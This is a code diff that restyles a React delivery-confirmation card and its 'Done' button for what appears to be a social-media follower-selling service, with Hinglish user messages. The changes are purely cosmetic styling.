-                    <p className="font-display font-bold text-base md:text-lg leading-snug bg-clip-text text-transparent bg-gradient-to-r from-white via-pink-100 to-cyan-200 text-center">
+                {/* Main high impact trust instruction card in pristine design */}
+                <div className="p-5 rounded-xl bg-[#050608] border border-white/5">
+                  <div className="space-y-2.5 text-center">
+                    <p className="font-display font-semibold text-sm leading-snug text-white">
                       ⚡ Kuch hi ghanto me followers deliver ho jayenge!
                     </p>
-                    <div className="h-[1px] w-12 bg-white/10 mx-auto" />
-                    <p className="text-center text-xs text-gray-300 leading-relaxed font-sans mt-2">
-                      Aapke account <span className="text-neon-cyan font-bold">@{deployedUser}</span> par safely <span className="text-neon-pink font-bold">+{deployedAmount} {deployedType}</span> bheje ja rahe hain. Delivery organic and gradual hogi taaki koi issue na aaye. Please keep patient!
+                    <div className="h-[1px] w-6 bg-white/10 mx-auto" />
+                    <p className="text-xs text-slate-400 leading-relaxed font-sans">
+                      Aapke account <span className="text-white font-medium">@{deployedUser}</span> par safely <span className="text-[#dfb24c] font-bold">+{deployedAmount} {deployedType}</span> bheje ja rahe hain. Delivery organic and gradual hogi taaki koi issue na aaye. Please keep patient!
                     </p>
                   </div>
                 </div>
 
-                {/* Action button */}
                 <button
                   type="button"
                   onClick={() => {
                     setShowDeliveryBanner(false);
                     resetForm();
                   }}
-                  className="w-full relative overflow-hidden py-3.5 rounded-xl font-display font-bold text-xs uppercase tracking-wider text-white bg-gradient-to-r from-neon-pink via-[#b5179e] to-neon-purple shadow-[0_0_15px_rgba(236,72,153,0.3)] hover:shadow-[0_0_25px_rgba(236,72,153,0.5)] transition-all cursor-pointer pointer-events-auto active:scale-95"
+                  className="w-full py-3 rounded-lg font-display font-semibold text-xs tracking-wider text-slate-950 bg-gradient-to-r from-[#dfb24c] to-[#f4d081] hover:brightness-110 active:scale-95 transition-all cursor-pointer"
                 >
                   Thik hai / Done 👍
                 </button>
